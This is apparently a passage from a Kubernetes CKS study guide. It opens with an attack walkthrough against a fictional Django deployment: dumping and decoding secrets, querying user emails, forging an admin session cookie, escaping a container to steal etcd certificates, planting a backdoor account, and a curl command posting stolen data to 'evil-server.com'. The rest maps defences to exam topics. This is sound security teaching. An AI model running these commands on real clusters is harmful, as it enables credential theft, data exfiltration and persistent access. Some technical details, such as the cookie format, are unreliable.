Credential Theft Against anihpj — The Exact Attack Walkthrough

🔴 This is the most likely attack against an unhardened anihpj deployment — and the one the CKS exam expects you to prevent
Phase 1: Initial Compromise — Exposed Dashboard or API
  # An attacker finds your cluster. How?

  # Method A: Internet-wide scan
  $ shodan search 'kubernetes' --fields ip_str,port,org
  203.0.113.42  6443  "Your Company Cloud"

  # Method B: Your dashboard is on the internet
  $ curl -s https://dashboard.anihpj.com:8443
  → Returns the Kubernetes Dashboard login page

  # Method C: Exposed kubeconfig leaked in a public GitHub repo
  $ git clone https://github.com/anihpj/infra
  $ cd infra && cat README.md
  # "kubectl config: copy this to ~/.kube/config"
  # ...contains the full kubeconfig with embedded cert + token.

  # ANY of these give the attacker kubectl access.
Phase 2: Discovery — What Can the Attacker See?
  # Attacker now has kubectl access. First reconnaissance commands:
  $ kubectl auth can-i --list
  Resources   Verbs
  *.*         [*]           ← CLUSTER ADMIN. They can do anything.

  $ kubectl get pods -o wide
  NAME                      READY   STATUS    IP            NODE
  anihpj-7d4f8b9c-x2k3m    1/1     Running   10.0.1.23     worker-1
  postgres-5c8d7f9a-x9k2m  1/1     Running   10.0.1.45     worker-2
  redis-8f3d2c1b-m4n7p     1/1     Running   10.0.2.12     worker-1

  $ kubectl get secrets
  NAME                  TYPE     DATA
  anihpj-secrets        Opaque   4      ← Database passwords, SECRET_KEY, etc.
  default-token-xxxxx   SA      3      ← Default SA token
  postgres-creds        Opaque   2      ← PostgreSQL username + password

  $ kubectl get configmaps
  NAME               DATA
  anihpj-config      3                 ← DATABASE_URL, DEBUG, ALLOWED_HOSTS

  # In 3 commands, the attacker knows:
  # - Every pod, its IP, and which node it's on
  # - All secrets by name (can read them next)
  # - All ConfigMaps with app configuration
Phase 3: Credential Extraction — The Payload
  # Step 1: Read the secrets
  $ kubectl get secret anihpj-secrets -o jsonpath='{.data}' | python -c \
      "import sys,json,base64; d=json.load(sys.stdin); \
       {print(k, base64.b64decode(v).decode()) for k,v in d.items()}"

  DJANGO_SECRET_KEY → 'django-insecure-abc123def456ghi789...'
  DATABASE_URL → 'postgres://anihpj_user:SuperSecret123!@postgres:5432/jobpost'
  EMAIL_HOST_PASSWORD → 'smtp-password-2024!'
  AWS_ACCESS_KEY_ID → 'AKIAXXXXXXXXXXXX'
  AWS_SECRET_ACCESS_KEY → 'wJalrXUtnFEMI/...EXAMPLEKEY'

  # In ONE command, the attacker has:
  # ✓ Django SECRET_KEY → can forge ANY user session cookie
  # ✓ Database credentials → direct access to postgres
  # ✓ Email credentials → can send phishing emails AS your domain
  # ✓ AWS credentials → access to S3, SQS, SNS, etc.

  # Step 2: Connect directly to the database
  $ kubectl exec -it anihpj-7d4f8b9c-x2k3m -- bash
  root@anihpj:/app# apt-get install -y postgresql-client
  root@anihpj:/app# psql postgres://anihpj_user:SuperSecret123!@postgres:5432/jobpost

  jobpost=# SELECT email FROM users LIMIT 5;
              email
  ─────────────────────────────
   john.smith@example.com
   jane.doe@bigcorp.com
   ceo@startupventures.com
   hiring@fortune500.com
   candidate123@gmail.com

  jobpost=# SELECT COUNT(*) FROM users;
   count
  ───────
   45000   ← 45,000 user records. All exfiltrated in minutes.
Phase 4: Session Forgery — Become Any User
  # With the Django SECRET_KEY, the attacker can forge ANY session:
  $ python3 << 'EOF'
  import hmac, hashlib, json, base64

  SECRET_KEY = b'django-insecure-abc123def456ghi789...'

  # Forge a session for admin@anihpj.com
  session_data = {
      '_auth_user_id': '1',           # Admin user ID
      '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
      '_auth_user_hash': hashlib.sha256(b'admin').hexdigest()
  }

  encoded = base64.b64encode(json.dumps(session_data).encode()).decode()
  signature = hmac.new(SECRET_KEY, encoded.encode(), hashlib.sha256).hexdigest()
  forged_cookie = f"{encoded}:{signature}"

  print(f"sessionid={forged_cookie}")
  # → sessionid=eyJfYXV0aF91c2VyX2lkIjogIjEiLCAiX2F1dGhfdX...:abc123def456..."

  # Now: curl -H "Cookie: sessionid=..." https://anihpj.com/admin/
  # → Attacker is authenticated as the ADMIN. Full Django admin panel access.
  # → Can view ALL job posts, ALL users, change passwords, delete data.
EOF
💡 CKS Exam Insight: Every Secret You Don't Encrypt is a Weapon

This entire attack chain takes under 5 minutes on an unhardened cluster. The ONLY reason it works is because Kubernetes secrets are stored unencrypted in etcd by default. The CKS exam will test your ability to: (1) enable encryption at rest (EncryptionConfiguration), (2) restrict RBAC to secrets, (3) use external secret stores, and (4) implement NetworkPolicy so even compromised pods can't reach the database directly.

Container Escape Scenario — Attacker Breaks Out to the Node

From "root inside container" to "root on the node" — the most dangerous escalation in K8s
  ESCALATION PATH: anihpj Pod → Container Escape → Node Root → Cluster Admin

  STEP 1: The attacker runs as root inside the anihpj container (DEFAULT!)
  ─────────────────────────────────────────────────────────────────────
  $ kubectl exec -it anihpj-7d4f8b9c-x2k3m -- id
  uid=0(root) gid=0(root) groups=0(root)
  → CONFIRMED: Root inside container. Game on.

  STEP 2: Check if host filesystem is mounted
  ───────────────────────────────────────────
  root@anihpj:/app# mount | grep -E '(hostPath|/host|node)'
  /dev/sda1 on /host type ext4 (rw,relatime)
  → The NODE's root filesystem is mounted inside the container at /host!

  STEP 3: Access the node's filesystem
  ─────────────────────────────────────
  root@anihpj:/app# ls /host/etc/kubernetes/manifests/
  kube-apiserver.yaml  kube-controller-manager.yaml  kube-scheduler.yaml  etcd.yaml
  → Static pod manifests! Modify these and kubelet will restart them.

  root@anihpj:/app# cat /host/etc/kubernetes/manifests/kube-apiserver.yaml
  → Contains --etcd-servers, --service-account-key-file, ALL API server config.

  STEP 4: Steal etcd certificates from the node
  ───────────────────────────────────────────────
  root@anihpj:/app# ls /host/etc/kubernetes/pki/
  ca.crt  ca.key  etcd/ca.crt  etcd/server.key  ...
  → etcd TLS certificates! Now the attacker can connect DIRECTLY to etcd:

  $ ETCDCTL_API=3 etcdctl --endpoints=https://10.0.0.1:2379 \
      --cacert=/host/etc/kubernetes/pki/etcd/ca.crt \
      --cert=/host/etc/kubernetes/pki/etcd/server.crt \
      --key=/host/etc/kubernetes/pki/etcd/server.key \
      get / --prefix --keys-only

  → Returns EVERY key in etcd — the entire cluster state.
  → All secrets, all ConfigMaps, all pod specs, RBAC rules, everything.

  STEP 5: Create a backdoor cluster-admin ServiceAccount
  ───────────────────────────────────────────────────────
  $ ETCDCTL_API=3 etcdctl put \
      /registry/serviceaccounts/default/backdoor-sa \
      '{"metadata":{"name":"backdoor"},"secrets":[{"name":"backdoor-token"}]}'

  → Permanent persistence. Even if the original pod is detected and killed,
    the backdoor SA remains and the attacker can always get back in.

  CKS FIXES — Every Layer That Would Have Stopped This:
  ┌───────────────────────────────────────────────────────────────┐
  │ 1. runAsNonRoot: true (Ch 18) — container NOT root = no escape│
  │ 2. readOnlyRootFilesystem: true (Ch 18) — can't write exploits│
  │ 3. Seccomp profile (Ch 15) — blocks nsenter, mount syscalls   │
  │ 4. AppArmor profile (Ch 14) — denies /host access             │
  │ 5. No hostPath mounts (Ch 17) — no node FS access             │
  │ 6. PodSecurity: Restricted (Ch 17) — all of the above enforced│
  │ 7. Falco (Ch 29) — detects and alerts on escape attempt       │
  └───────────────────────────────────────────────────────────────┘

Attacker Kill Chain vs CKS Defenses — Complete Map

Every attack stage — and exactly where CKS stops it
  🔴 ATTACKER STAGE              🛡️ CKS DEFENSE

  1. RECONNAISSANCE               → Firewall, --anonymous-auth=false
  2. INITIAL ACCESS               → Seccomp, RBAC, SA automount=false
  3. EXECUTION                    → Audit log, Falco, readOnlyRootFS
  4. PERSISTENCE                  → RBAC, PodSecurity restricted
  5. LATERAL MOVEMENT             → NetworkPolicy, encryption at rest
  6. EXFILTRATION                 → NetworkPolicy egress, AppArmor

  🏁 Attacker blocked at EVERY stage. Zero data lost.

The Attacker's Decision Flow — How They Choose Targets

Attackers don't randomly attack clusters — they follow a predictable, repeatable decision pattern. Understanding this flow is one of the most valuable mental models in the CKS curriculum because it lets you anticipate the attacker's next move and place your defenses exactly where they will be encountered. Each step in the flow corresponds to a specific MITRE ATT&CK tactic and a specific CKS defense chapter.

Step 1 — Scan: The attacker starts with reconnaissance. They use tools like Shodan, Masscan, or even simple curl scripts to find Kubernetes API servers exposed on the internet. They look for port 6443 (the secure API port) and port 8001 (the insecure read-only port, often left open). They also scan for Kubernetes Dashboard at common paths like /api/v1/namespaces/kubernetes-dashboard. If your API server has --anonymous-auth=true (the default!), the scan alone gives them full cluster access. Defense: Network firewalls, API server flags (Ch 8), and never exposing the dashboard without OIDC authentication (Ch 5).

Step 2 — Access: Once a cluster is found, the attacker attempts authentication. If anonymous auth is enabled, no credentials are needed — they are already in. Otherwise, they try stolen kubeconfig files (often found in public GitHub repositories), default ServiceAccount tokens, or brute-force attacks against weak RBAC configurations. A common mistake: giving the default ServiceAccount in every namespace cluster-wide read access "to make development easier." Defense: RBAC with least privilege (Ch 9), disable automount of ServiceAccount tokens on pods that don't need API access (Ch 10), and OIDC integration (Ch 5).

Step 3 — Map: With access established, the attacker runs reconnaissance commands: kubectl get pods --all-namespaces, kubectl get secrets, kubectl get nodes -o wide. In minutes, they have a complete map of your infrastructure — every application, every database, every secret name, every node IP. This is why RBAC must be namespace-scoped; if the attacker's credential only has access to the anihpj namespace, they cannot enumerate the rest of your cluster. Defense: Namespace-scoped RBAC (Ch 9), NodeRestriction admission plugin (Ch 11).

Step 4 — Steal: The attacker extracts credentials. In a default cluster, this is trivial: kubectl get secret anihpj-secrets -o yaml followed by echo "" | base64 -d. In seconds they have your database password, Django SECRET_KEY, API tokens, and TLS private keys. If the pod's ServiceAccount token is mounted (which it is by default), they also have a valid JWT that can be used to make authenticated API calls. Defense: Encryption at rest for Secrets (Ch 19), external secret stores like Vault (Ch 20), and automountServiceAccountToken: false (Ch 10).

Step 5 — Move: The attacker pivots laterally. Without NetworkPolicies, the compromised anihpj pod can reach the PostgreSQL pod on port 5432, the Redis pod on port 6379, and any other service in the cluster. They can also attempt to reach pods in kube-system to compromise control plane components. Defense: Default-deny NetworkPolicy with explicit allow rules (Ch 6), namespace isolation, and mTLS via service mesh (Ch 22).

Step 6 — Exfiltrate: The attacker needs to get data out. If egress NetworkPolicies are not in place, they can simply curl -X POST https://evil-server.com/upload --data @stolen_data.sql. Even if HTTP egress is blocked, sophisticated attackers use DNS tunneling: encoding data into DNS query subdomains that are forwarded to an attacker-controlled DNS server. Defense: Egress NetworkPolicy (Ch 6), AppArmor profiles restricting network access (Ch 14), and Falco rules detecting anomalous outbound connections (Ch 29).

The flow diagram below visualizes these six steps. Every arrow represents a point where a CKS control can stop the attack cold. The exam tests your ability to place the right control at the right arrow.

anihpj Security Threat Map — Before vs After Hardening

❌ anihpj WITHOUT CKS Hardening
  • 🔴 anihpj pod runs as ROOT
  • 🔴 SECRET_KEY in plain environment variables
  • 🔴 No Seccomp profile applied
  • 🔴 PostgreSQL reachable by ALL pods
  • 🔴 No image scanning — blind deploys
  • 🔴 No audit logging — zero traceability
  • 🔴 ServiceAccount has full API access
  • 🔴 Images from any registry accepted
✅ anihpj WITH CKS Hardening
  • ✅ Ingress TLS + no plaintext HTTP
  • ✅ anihpj pod: non-root, read-only FS, Seccomp
  • ✅ Secrets encrypted at rest in etcd
  • ✅ NetworkPolicy: only anihpj → postgres
  • ✅ Image scanned, signed, verified before deploy
  • ✅ Falco monitoring all runtime behavior
  • ✅ SA with automount=false, zero API permissions
  • ✅ OPA/Kyverno: only approved registries allowed

The STRIDE Threat Model — Applied to Kubernetes, Mapped to CKS Controls

STRIDE is Microsoft's threat classification framework, and it maps perfectly to Kubernetes security. Every threat in K8s falls into one of six categories — and every CKS domain addresses specific categories. Understanding this mapping transforms how you think about exam questions: instead of "what tool do I use?", you think "what type of threat am I countering?"

STRIDE CategoryWhat It Means in K8sReal K8s ExampleCKS ControlChapter
SpoofingPretending to be another identityAttacker steals a ServiceAccount token from a pod and uses it to authenticate to the API server as that SABound tokens, token expiry, disable automountCh 10
TamperingModifying data or code without authorizationAttacker modifies a container image in the registry, replacing it with a backdoored versioncosign image signing, Kyverno verifyImages, admission controlCh 24, 26
RepudiationDenying having performed an actionAdmin deletes a production namespace, claims "it wasn't me" — with no audit logs, there's no proofKubernetes audit logging, sudo logging, SIEM integrationCh 13, 28
Information DisclosureExposing data to unauthorized partiesAttacker reads Secrets from etcd, extracts database passwords and API keys in plaintextEncryptionConfiguration, external KMS, VaultCh 19, 20
Denial of ServiceMaking resources unavailable to legitimate usersAttacker deploys a crypto-mining DaemonSet that consumes all node CPU — legitimate pods get evictedResourceQuota, LimitRange, PodSecurityPolicy/PSS, admission controlCh 17, 24
Elevation of PrivilegeGaining higher permissions than authorizedAttacker exploits a kernel CVE from inside a container, escapes to the host as root, pivots to other nodesSeccomp, AppArmor, non-root containers, drop ALL capabilities, kernel patchingCh 12, 14, 15, 18

How to use STRIDE on the CKS exam: When you read an exam question, identify which STRIDE category the scenario describes. An "attacker reading secrets" question → Information Disclosure → you need encryption (Ch19) or Vault (Ch20). An "attacker running commands as another user" question → Spoofing/Elevation → you need RBAC (Ch9) + SA lockdown (Ch10). The STRIDE category IS the answer's domain. This mental shortcut reduces "what do I do?" to a lookup, not a guess.

MITRE ATT&CK for Containers — The Attackers' Playbook, Mapped to Your Defenses

The MITRE ATT&CK framework includes a dedicated Containers matrix that catalogs every known technique attackers use against containerized environments. Understanding this matrix is not required for CKS, but it will make you a dramatically better security engineer because it shows you exactly what real attackers do — and exactly which CKS control stops each technique:

The CKS exam connection: While the exam does not explicitly test MITRE ATT&CK knowledge, every CKS task maps to a specific ATT&CK technique. When you configure a NetworkPolicy (Ch6), you are countering T1615 (Lateral Movement). When you set up Falco rules (Ch29), you are countering T1609 (Execution). When you enable audit logging (Ch28), you are countering Repudiation. Understanding the "why" behind each CKS task — the specific threat it counters — transforms memorization into understanding.

💡 Key Takeaway for the CKS Exam

When you see a CKS exam question, ask yourself: "Which attack stage is this?" Reconnaissance? Initial Access? Lateral Movement? Exfiltration? Map the attack stage to the STRIDE category, and you'll know exactly which CKS control to deploy. The exam tests your ability to match the right defense to the right threat — not just your ability to write YAML.

Chapter 3: Security Architecture Overview — The CKS Mental Model

Every CKS control you will configure — RBAC, NetworkPolicies, Seccomp, Audit Logging, Admission Controllers — operates on a specific Kubernetes component. If you don't understand which component handles authentication vs which handles admission control vs which handles runtime sandboxing, you will fail the exam. This chapter builds the mental model that maps every security control to its architectural home. Once you internalize this map, every subsequent chapter becomes a matter of "I know where this control lives and how to configure it."

🟢 Beginner ⏱️ ~1.5 hours 🏗️ Architecture 🧠 Mental Model

🎯 What You'll Learn

  • ✅ Map every CKS security control to the exact Kubernetes component that enforces it
  • ✅ Understand the three-stage request pipeline: Authentication → Authorization → Admission Control
  • ✅ Identify which component handles secrets, which handles networking, and which sandboxes containers
  • ✅ Know the 8 essential security tools you will use throughout this guide, when to use each, and whether they appear on the CKS exam
  • ✅ Build the mental architecture that lets you answer any CKS question by asking "which component does this control live on?"
🎓 CKS Relevance
Cluster Setup 15% Cluster Hardening 15% System Hardening 10%
🧠 The Architecture Question Strategy

Many CKS exam tasks don't tell you which component to configure — they describe a security requirement and expect YOU to know where to implement it. Use this mental flowchart:

  • "Block pods from running as root" → Which component? → Pod spec (SecurityContext) + Admission control (PSS) → Chapters 17, 18
  • "Prevent access to the metadata API" → Which component? → Network layer (NetworkPolicy) + Node hardening (iptables) → Chapters 6, 13
  • "Alert when someone kubectl exec into a pod" → Which component? → API audit (Audit Policy) + Runtime (Falco) → Chapters 28, 29
  • "Encrypt Secrets" → Which component? → etcd (EncryptionConfiguration) → Chapter 19
  • Every CKS task is: "Configure Component X to enforce Security Control Y." This chapter teaches you the X→Y mapping.

3.1 How CKS Security Maps to Kubernetes Components

Kubernetes is not one program — it is a distributed system of cooperating components, each running as a separate process with its own configuration, its own ports, and its own security surface. Understanding which component owns which security responsibility is the single most important architectural insight for the CKS exam. If you configure a Seccomp profile on the API server, nothing happens — because Seccomp is enforced by the container runtime on worker nodes, not by the API server. These kinds of category errors are exactly what the exam tests for.

📖 The CKS Component → Control Mapping

Every security control in the CKS curriculum is enforced by exactly ONE Kubernetes component. Your job as a CKS administrator is to know which component to configure for which control. The diagram below is the master map — return to it whenever you are unsure where a control lives.

Kubernetes Security Architecture — Components + Controls

Every CKS control mapped to its enforcement component

Defense-in-Depth: The 5-Layer Architecture Model

The CKS curriculum is structured as concentric layers of defense. Each layer independently stops attacks — if an attacker bypasses one layer, the next layer catches them. This is defense-in-depth, and it's the architectural principle behind every CKS control you will learn:

Concentric Security Layers — Outer to Inner
                    ┌───────────────────────────────────────────┐
                    │  LAYER 1: EDGE (Ingress, TLS, WAF)        │
                    │  Ch 5 (Dashboard), Ch 7 (Ingress TLS)     │
                    │  ┌─────────────────────────────────────┐  │
                    │  │  LAYER 2: API (RBAC, AuthN, Audit)  │  │

                    │  │  │  ┌─────────────────────────┐  │  │  │
                    │  │  │  │  LAYER 4: CONTAINER     │  │  │  │
                    │  │  │  │  Ch 14-18, 21 (SecComp, │  │  │  │
                    │  │  │  │  AppArmor, Seccomp, PSS)│  │  │  │

Deep Dive: What Happens When Each Component Is Compromised

Understanding the architecture is not enough. You must understand the blast radius of each component's failure. When the CKS exam asks you to "harden a cluster," it is asking you to reduce the blast radius of each component to the minimum possible. Here is what happens when each component falls — and what the CKS controls do to contain it:

Component Compromise Scenarios — Blast Radius Analysis
  COMPONENT: kube-apiserver
  ─────────────────────────
  IF COMPROMISED (e.g., anonymous auth enabled + exposed):
    Attacker can: create/delete any resource, read ALL Secrets, deploy
    malicious pods as cluster-admin, disable audit logging, modify RBAC
    rules to create permanent backdoors, delete all namespaces.
    BLAST RADIUS: ENTIRE CLUSTER. Every namespace. Every secret. Every pod.

  CKS CONTROLS THAT CONTAIN THIS:
    ✅ --anonymous-auth=false (Ch 8) — first line of defense
    ✅ RBAC with least privilege (Ch 9) — even if authenticated, limited
    ✅ OIDC with MFA (Ch 5) — strong identity verification
    ✅ API audit logging (Ch 28) — detect anomalous API calls
    ✅ NetworkPolicy on port 6443 — restrict which IPs can reach API

  COMPONENT: etcd
  ────────────────
  IF COMPROMISED (e.g., direct network access to port 2379):
    Attacker can: read ALL cluster state (every pod, secret, config),
    modify any resource by writing directly to etcd, delete the entire
    cluster state, create backdoor ServiceAccounts that bypass RBAC.
    BLAST RADIUS: ENTIRE CLUSTER. Worse than API server — etcd access
    bypasses ALL authentication, authorization, and admission control.

  CKS CONTROLS THAT CONTAIN THIS:
    ✅ Firewall: only API server IP can reach port 2379 (Ch 8)
    ✅ etcd peer-to-peer TLS with client certificate verification (Ch 8)
    ✅ Encryption at rest (Ch 19) — even with direct etcd access, Secrets
       are encrypted and unreadable without the encryption key
    ✅ etcd backup (Ch 36) — recover from catastrophic etcd loss

  COMPONENT: kubelet (port 10250)
  ───────────────────────────────
  IF COMPROMISED (e.g., anonymous auth enabled on kubelet):
    Attacker can: run arbitrary commands inside any container on that
    node via /exec, read pod logs, read Secret values mounted as volumes,
    access the node filesystem via hostPath, potentially escape to node.
    BLAST RADIUS: ALL PODS ON THAT NODE. Not the whole cluster — but
    all applications and all Secrets on that specific worker.

  CKS CONTROLS THAT CONTAIN THIS:
    ✅ --anonymous-auth=false (Ch 8)
    ✅ --authorization-mode=Webhook (Ch 11) — every kubelet request
       is authorized by the API server, not locally
    ✅ NodeRestriction admission plugin (Ch 11) — kubelet can only
       modify its own node's resources
    ✅ --read-only-port=0 (Ch 8) — disable the insecure port entirely

  COMPONENT: Container Runtime
  ────────────────────────────
  IF COMPROMISED (container escape, e.g., root + privileged + no Seccomp):
    Attacker can: break out of container → gain root on the node,
    access all other containers on that node, read all Secrets mounted
    on that node, access cloud metadata (169.254.169.254), deploy
    crypto-miners, establish persistent node access.
    BLAST RADIUS: THE NODE AND ALL PODS ON IT. From there, lateral
    movement to other nodes is possible.

  CKS CONTROLS THAT CONTAIN THIS:
    ✅ runAsNonRoot: true (Ch 18) — even if app is exploited, no root
    ✅ Seccomp profile (Ch 15) — blocks dangerous syscalls like nsenter
    ✅ AppArmor profile (Ch 14) — blocks file/network paths
    ✅ readOnlyRootFilesystem (Ch 18) — attacker cannot write tools
    ✅ drop ALL capabilities (Ch 18) — no CAP_SYS_ADMIN, no escape
    ✅ PodSecurity: Restricted (Ch 17) — enforces all of the above

  COMPONENT: CNI / kube-proxy
  ───────────────────────────
  IF COMPROMISED (no NetworkPolicy — flat network):
    Attacker can: from one compromised pod, reach every other pod,
    every database, every cache, every message queue, pods in kube-system
    that have cluster-admin ServiceAccounts.
    BLAST RADIUS: EVERY POD IN THE CLUSTER reachable from the compromised
    pod. With no NetworkPolicies, this is ALL pods.

  CKS CONTROLS THAT CONTAIN THIS:
    ✅ Default-deny NetworkPolicy (Ch 6) — blocks all pod-to-pod traffic
    ✅ Explicit allow rules — only whitelisted pod-to-pod communication
    ✅ Egress NetworkPolicy (Ch 6) — block data exfiltration
    ✅ mTLS via Istio/Linkerd (Ch 22) — even if network allows it,
       unauthorized pods cannot authenticate to services

Real anihpj Example: Applying the 5-Layer Defense Model

Let's trace what happens to a single kubectl apply -f anihpj-deployment.yaml through all 5 layers. This is not theoretical — this is exactly what you will configure in later chapters, and it is exactly what the CKS exam tests:

❌ anihpj WITHOUT Defense-in-Depth
  • Layer 1 (Edge): Dashboard on public internet, no TLS on Ingress, anyone with the URL can access
  • Layer 2 (API): Default ServiceAccount has cluster-admin, no RBAC restrictions, anonymous auth enabled
  • Layer 3 (Network): No NetworkPolicies. Every pod can reach every other pod on every port. anihpj pod can connect directly to postgres, redis, and kube-system pods.
  • Layer 4 (Container): anihpj runs as root, no Seccomp, no AppArmor, writable filesystem, all capabilities. One RCE in Django = full container + node escape.
  • Layer 5 (Data): SECRET_KEY and DATABASE_URL in plaintext Secret (base64 only). etcd stores them unencrypted. Anyone with etcd access reads everything.

RESULT: One vulnerability in any layer = total cluster compromise.

✅ anihpj WITH Defense-in-Depth (CKS)
  • Layer 1 (Edge): Ingress with TLS termination, WAF in front, Dashboard requires OIDC authentication (Ch 5, 7)
  • Layer 2 (API): RBAC: anihpj SA can only create pods in "anihpj" namespace. Anonymous auth disabled. Audit logging records all API calls. (Ch 8, 9, 28)
  • Layer 3 (Network): Default-deny NetworkPolicy. Explicit allow: anihpj→postgres:5432, ingress→anihpj:8000. Nothing else. (Ch 6)
  • Layer 4 (Container): Non-root user (uid 1000), Seccomp profile (50 syscalls, not 300+), AppArmor profile (only /app writable), readOnlyRootFS, drop ALL capabilities. (Ch 14, 15, 18)
  • Layer 5 (Data): Secrets encrypted at rest in etcd (AES-256). Vault injects DB credentials at runtime — they never touch etcd at all. (Ch 19, 20)

RESULT: Attacker must breach 5 independent layers. Failure at any layer is contained. 5 failures needed for total compromise.

💡 CKS Exam Insight: The Component Question

When you face a CKS task, silently ask: "Which component enforces this?" If the task says "encrypt secrets," the component is etcd. If the task says "restrict syscalls," the component is the container runtime. If the task says "block pods from a namespace," the component is the API server (via admission control). This one question — "Which component?" — guides you to the right configuration file, the right flags, and the right YAML. Master this component map and you master the exam.

3.2 Authentication vs Authorization vs Admission Control

Every API request to Kubernetes passes through three sequential security gates before it is persisted to etcd. Understanding the difference between these three stages — and the order in which they execute — is essential for the CKS exam. If you confuse authorization with admission control (a common mistake), you will configure the wrong component and the exam task will fail.

📖 Three Gates, Three Questions, Three Answers

Authentication (AuthN): "Who are you?" — Verifies identity via certificates, tokens, or OIDC. Authorization (AuthZ): "What can you do?" — Checks RBAC policies against the authenticated identity. Admission Control: "Is this request allowed?" — Validates and mutates the request before it is persisted. All three must pass. If any one fails, the request is rejected with an HTTP error code.

The Kubernetes Request Pipeline — Complete Flow

From kubectl to etcd — every gate, every check
  kubectl apply -f anihpj-pod.yaml
       │
       ▼
  ┌──────────────────────────────────────────────────────────┐
  │  GATE 1: AUTHENTICATION — "Who are you?"                 │
  │  ──────────────────────────────────────────────────────── │
  │  Methods (checked in order):                              │
  │    ① X.509 Client Certificate (from kubeconfig)          │
  │    ② Bearer Token (ServiceAccount JWT)                   │
  │    ③ OIDC ID Token (Google, GitHub, Azure AD)            │
  │    ④ Bootstrap Token (node join)                         │
  │    ⑤ Static Token File (legacy — avoid)                  │
  │    ⑥ Anonymous (disabled by default → Ch 8)              │
  │                                                           │
  │  ❌ FAIL → HTTP 401 Unauthorized                          │
  │  ✅ PASS → Identity established: user or SA name          │
  └──────────────────────────────┬───────────────────────────┘
                                 │ ✅ "I am user 'admin'" or
                                 │    "I am SA 'default/any'"
                                 ▼
  ┌──────────────────────────────────────────────────────────┐
  │  GATE 2: AUTHORIZATION — "What can you do?"              │
  │  ──────────────────────────────────────────────────────── │
  │  Modes (checked in order):                                │
  │    ① Node authorizer (kubelet-only requests)             │
  │    ② ABAC (legacy — avoid)                               │
  │    ③ RBAC (Role + RoleBinding) ← THE CKS MODE            │
  │    ④ Webhook (external authorization service)            │
  │                                                           │
  │  Process:                                                 │
  │    • API server looks up RoleBindings for this user/SA   │
  │    • Checks if Role allows the requested verb+resource   │
  │    • ClusterRoles apply cluster-wide                     │
  │    • Roles are namespace-scoped                           │
  │                                                           │
  │  ❌ FAIL → HTTP 403 Forbidden                             │
  │  ✅ PASS → User has permission for this action            │
  └──────────────────────────────┬───────────────────────────┘
                                 │ ✅ "User 'admin' CAN create
                                 │    pods in namespace 'anihpj'"
                                 ▼
  ┌──────────────────────────────────────────────────────────┐
  │  GATE 3: ADMISSION CONTROL — "Is this request allowed?"  │
  │  ──────────────────────────────────────────────────────── │
  │  Two phases:                                              │
  │                                                           │
  │  Phase 1: MUTATING Admission (run first)                 │
  │    • Can MODIFY the request (add sidecars, inject env)   │
  │    • Example: Istio adds sidecar proxy automatically      │
  │    • Example: inject imagePullSecrets                     │
  │                                                           │
  │  Phase 2: VALIDATING Admission (run second)               │
  │    • Can only ALLOW or DENY — cannot modify              │
  │    • Example: Pod Security Standards (PSS) — Ch 17        │
  │    • Example: OPA/Gatekeeper policies — Ch 24             │
  │    • Example: ImagePolicyWebhook — Ch 23                  │
  │                                                           │
  │  ❌ FAIL → HTTP 403 with policy reason                    │
  │  ✅ PASS → Request is valid and compliant                 │
  └──────────────────────────────┬───────────────────────────┘
                                 │ ✅ Pod spec is valid,
                                 │    secure, and compliant
                                 ▼
  ┌──────────────────────────────────────────────────────────┐
  │  ✅ STORED IN etcd + Scheduled to worker node             │
  │  • kubectl receives "pod/anihpj created"                  │
  │  • Scheduler assigns pod to a healthy node               │
  │  • kubelet on that node starts the container             │
  └──────────────────────────────────────────────────────────┘

AuthN vs AuthZ vs Admission — Side-by-Side Comparison

AspectAuthentication (AuthN)Authorization (AuthZ)Admission Control

Failure Code401 Unauthorized403 Forbidden403 with policy reason
Can Modify Request?NoNoYes (mutating phase only)

Example Config--oidc-issuer-url--authorization-mode=RBAC--enable-admission-plugins

Why the Order Matters — A CKS Exam Scenario

😰 Scenario: What Happens When You Get the Order Wrong

Imagine you set up an OPA policy that blocks pods with hostPath mounts. But you also configure RBAC to deny all users the ability to create pods. A user submits a pod YAML with a hostPath mount. What happens?

Answer: The request fails at Gate 2 (Authorization) with 403 Forbidden — the OPA policy at Gate 3 is never even checked. The user sees "Forbidden" — not "Policy violation: hostPath not allowed." Without understanding the order, you might waste hours debugging why your admission policy "isn't working" when in fact RBAC is blocking the request first.

CKS Lesson: Always check Gate 1 first, then Gate 2, then Gate 3. If a security control isn't working, ask "which gate am I at, and is an earlier gate blocking the request?"

⚠️ The Order Is Fixed — You Cannot Change It

The Authentication → Authorization → Admission Control pipeline is hardcoded into the API server. You cannot reorder it. You cannot skip a gate (well, you can disable admission plugins, but you cannot skip AuthN or AuthZ — though you can set them to "AlwaysAllow" which is effectively skipping them, and that's exactly what the CKS exam tests you on fixing). The exam will give you a cluster where one gate is misconfigured and ask you to fix it. Identifying WHICH gate is broken is the first step.

Decision Tree: Which Gate Is Failing?

🔍 You run kubectl and get an error. Which gate failed?
401 Unauthorized → Gate 1 (AuthN). Fix: Check certs, tokens, OIDC config. Chapter 8.
Not 401. Move to next check.
📋 Is the error 403 Forbidden with NO policy reason?
Yes → Gate 2 (AuthZ). Fix: Check RBAC roles and bindings. Chapter 9.
Not a plain 403. Move to next check.
📝 Is the error 403 Forbidden WITH a policy reason (e.g., "DENIED by PodSecurity")?
Yes → Gate 3 (Admission Control). Fix: Check PSS labels, OPA policies, ImagePolicyWebhook. Chapters 17, 23, 24.
None of the above? Check API server logs with kubectl logs -n kube-system kube-apiserver-<node>. Look for the exact error message and matching gate.

Deep Dive: Authentication Methods — How Each One Works

The CKS exam expects you to understand not just that authentication exists, but how each method works at the protocol level — because the exam tasks require you to configure them. Here is each method, how it works, and when the exam expects you to use it:

X.509 Client Certificates — The Default kubectl Auth Method
  HOW IT WORKS:
  Every kubeconfig file contains a client certificate + private key embedded
  as base64. When kubectl connects, it presents the certificate. The API
  server verifies it against the cluster's CA certificate. The certificate's
  Subject CN (Common Name) becomes the username. The O (Organization) fields
  become the user's groups.

  Example kubeconfig (simplified):
  ┌─────────────────────────────────────────────────────────────┐
  │ users:                                                       │
  │ - name: anihpj-admin                                         │
  │   user:                                                      │
  │     client-certificate-data: LS0tLS1...  ← YOUR identity     │
  │     client-key-data: LS0tLS1...         ← YOUR private key   │
  └─────────────────────────────────────────────────────────────┘

  Why it matters for CKS:
  • This is the DEFAULT authentication method for kubectl
  • The CN= field maps to the username in RBAC RoleBindings
  • The O= field maps to the group — ClusterRoleBindings can target O=
  • Certificate rotation (Ch 12) is about renewing these certs before expiry
  • If someone steals your kubeconfig, they ARE you — no password needed
Bearer Tokens (JWT) — The ServiceAccount Auth Method
  HOW IT WORKS:
